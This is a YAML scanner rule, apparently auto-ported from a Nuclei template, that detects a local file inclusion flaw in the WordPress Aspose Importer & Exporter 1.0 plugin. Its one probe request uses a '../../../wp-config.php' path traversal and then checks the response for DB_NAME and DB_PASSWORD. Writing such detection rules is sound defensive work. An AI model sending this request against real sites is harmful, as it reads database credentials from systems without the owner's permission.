schema_version: 1
id: "cortex.community:aspose-ie-file-download"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "WordPress Aspose Importer & Exporter 1.0 - Local File Inclusion"
  description: "WordPress Aspose Importer & Exporter version 1.0 is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://packetstormsecurity.com/files/131162/"
    - "https://wordpress.org/plugins/aspose-importer-exporter"
  cwes: [23]
  tags: ["aspose", "packetstorm", "wordpress", "wp-plugin", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../wp-config.php" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_NAME" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_PASSWORD" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
